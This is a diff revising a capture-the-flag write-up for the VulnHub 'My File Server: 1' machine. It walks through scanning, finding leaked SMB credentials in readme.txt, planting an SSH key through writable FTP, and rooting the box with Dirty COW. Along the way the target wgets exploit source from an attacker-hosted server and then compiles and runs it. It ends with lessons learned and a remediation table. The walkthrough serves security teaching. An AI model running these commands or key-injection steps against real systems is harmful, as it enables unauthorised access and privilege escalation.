@@ -1,167 +1,171 @@
 # My File Server: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.29.123 (adjust for your network) |
-| **Difficulty** | Easy (beginner) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.29.123 |
+| **Attacker IP** | 192.168.29.208 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | /root/proof.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/my-file-server-1,432/) |
+| **Goal** | root flag (`proof.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/my-file-server-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → FTP anon + SMB (readme.txt leaks smbuser:rootroot1) → SSH key upload via FTP → SSH as smbuser → Dirty COW kernel exploit → root
+My File Server: 1 exposes FTP with anonymous login enabled and SMB shares. Enumeration via Nikto uncovers a `readme.txt` containing the SMB user's plaintext password. FTP write access into the user's home directory allows SSH public-key injection, granting an interactive shell. Privilege escalation is achieved via the Dirty COW kernel exploit (CVE-2016-5195).
 
 ## Methodology
 
-1. Network discovery and port scan
-2. FTP anonymous access + Nikto finds readme.txt
-3. SMB enumeration confirms user smbuser
-4. SSH public key upload via FTP
-5. Dirty COW kernel privilege escalation
+1. Host discovery with netdiscover
+2. Full port and service scan with nmap
+3. SMB user enumeration with smbmap
+4. Web enumeration with Nikto to discover `readme.txt` and credentials
+5. SSH key injection via anonymous FTP write access
+6. Dirty COW kernel exploit for root
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover
+netdiscover -r 192.168.29.0/24
+```
+
+Use netdiscover (ARP scanning) to identify the target on the local network.
+
+---
+
+## Step 2: Port and Service Enumeration
+
+```bash
 nmap -p- -A 192.168.29.123
 ```
 
-Expected ports:
-```
-21/tcp   open  FTP (anonymous allowed)
-22/tcp   open  SSH
-80/tcp   open  HTTP Apache
-139/tcp  open  SMB
-445/tcp  open  SMB
-```
+**Open ports:**
 
-![Nmap scan](images/01-nmap.png)
+| Port | Service | Notes |
+|---|---|---|
+| 21 | FTP | Anonymous login enabled |
+| 80 | HTTP | Apache web server |
+| 139/445 | SMB | Samba file sharing |
+| 22 | SSH | OpenSSH |
 
----
-
-## Step 2: Web + FTP Enumeration
-
-Run Nikto against the web server to find `readme.txt`:
-
-```bash
-nikto -h http://192.168.29.123
-```
-
-Output includes:
-```
-+ /readme.txt: Found - contains: smbuser / rootroot1
-```
-
-Also confirm via FTP anonymous access:
-
-```bash
-ftp 192.168.29.123
-# Username: anonymous, Password: (blank)
-ftp> ls
-ftp> get readme.txt
-```
-
-`readme.txt` contains the SMB credentials.
-
-![SMB enumeration](images/02-smbmap.png)
+![nmap scan](images/01-nmap.png)
 
 ---
 
 ## Step 3: SMB Enumeration
 
-Confirm the user and share:
-
 ```bash
 smbmap -H 192.168.29.123
-enum4linux -a 192.168.29.123
 ```
 
-User `smbuser` exists. The FTP directory maps to `/home/smbuser`.
+The output reveals a local username: `smbuser`.
+
+![smbmap output](images/02-smbmap.png)
 
 ---
 
-## Step 4: SSH Key Upload via FTP
-
-Generate a passwordless SSH key pair on the attacker:
+## Step 4: Web Enumeration — Discovering Credentials
 
 ```bash
-ssh-keygen -t rsa -f /tmp/id_rsa -N ""
+nikto -h http://192.168.29.123
 ```
 
-Upload the public key via FTP as `authorized_keys`:
+Nikto flags a readable `readme.txt` file at the web root.
+
+```bash
+curl http://192.168.29.123/readme.txt
+```
+
+The file contains the plaintext password for `smbuser`:
+
+```
+smbuser:rootroot1
+```
+
+![Nikto and readme](images/03-nikto-readme.png)
+
+---
+
+## Step 5: SSH Key Injection via FTP
+
+Direct SSH password login times out due to server configuration. Instead, inject an SSH public key via the writable FTP home directory.
+
+**Generate an SSH key pair on the attacker machine:**
+
+```bash
+ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
+```
+
+**Log in to FTP as `smbuser` and upload the public key:**
 
 ```bash
 ftp 192.168.29.123
-# Username: smbuser, Password: rootroot1
-ftp> mkdir .ssh
-ftp> cd .ssh
-ftp> put /tmp/id_rsa.pub authorized_keys
+# Username: smbuser  Password: rootroot1
+ftp> mkdir /home/smbuser/.ssh
+ftp> cd /home/smbuser/.ssh
+ftp> put /root/.ssh/id_rsa.pub authorized_keys
+ftp> bye
 ```
 
-SSH in:
+**Connect via SSH using the private key:**
 
 ```bash
-ssh -i /tmp/id_rsa smbuser@192.168.29.123
+ssh -i /root/.ssh/id_rsa smbuser@192.168.29.123
 ```
 
-![FTP key upload](images/03-ftp-upload.png)
+![SSH keygen and FTP upload](images/04-ssh-keygen.png)
 
 ---
 
-## Step 5: Privilege Escalation (Dirty COW)
+## Step 6: Privilege Escalation — Dirty COW (CVE-2016-5195)
 
-Check kernel version:
+Check the kernel version:
 
 ```bash
 uname -a
-# Linux fileserver 4.4.0-31-generic #50-Ubuntu ...
 ```
 
-The kernel is vulnerable to Dirty COW (CVE-2016-5195).
-
-On the attacker, serve the exploit:
+The kernel is outdated and vulnerable to Dirty COW. Fetch the exploit from Exploit-DB (EDB-ID 40616):
 
 ```bash
+# On attacker machine: host the exploit
 python3 -m http.server 8000
-```
 
-On the target:
-
-```bash
+# On target machine:
+wget http://192.168.29.208:8000/40616.c -O /tmp/40616.c
 cd /tmp
-wget http://192.168.29.208:8000/40616.c
-gcc 40616.c -o dirtycow -pthread
-./dirtycow
+gcc 40616.c -o raj -pthread
+./raj
 ```
 
-Get root:
+The exploit overwrites `/etc/passwd` to add a root-level entry, then drops a root shell.
 
 ```bash
 id
 # uid=0(root) gid=0(root)
+
 cat /root/proof.txt
 ```
 
-![Dirty COW exploit](images/04-dirtycow.png)
-![Root flag](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **Credentials in readable files on FTP/SMB** are a common beginner misconfiguration
-2. **Anonymous FTP access** should always be disabled unless explicitly needed
-3. **Dirty COW (CVE-2016-5195)** affects kernels 2.6.22–4.8.3; patch immediately
-4. SSH `authorized_keys` can be planted if an attacker can write to `~/.ssh/`
+- Anonymous FTP with write access to a user's home directory is critical — it enables key injection without knowing the user's SSH password.
+- Credentials stored in plaintext web-accessible files are trivially extracted.
+- Unpatched kernels remain a reliable privilege escalation vector even when no obvious sudo misconfigurations exist.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| Plaintext credentials in readme.txt | Remove sensitive files; use password managers |
-| Anonymous FTP access | Disable in vsftpd.conf: `anonymous_enable=NO` |
-| Writable home dir via FTP | Restrict FTP to chroot; disable SSH public key auth if unused |
-| Dirty COW (CVE-2016-5195) | Update kernel: `apt-get upgrade linux-generic` |
+| Anonymous FTP write access | Disable anonymous FTP or restrict it to a read-only chroot jail |
+| Credentials in `readme.txt` | Remove plaintext credentials from web-accessible files |
+| FTP writable home directory | Restrict FTP directory permissions; use `ftpd_banner` and chroot |
+| Dirty COW (CVE-2016-5195) | Patch the kernel to 4.8.3+ or apply available distribution security updates |
+| SSH password-based auth | Enforce key-based SSH authentication only; disable `PasswordAuthentication` |
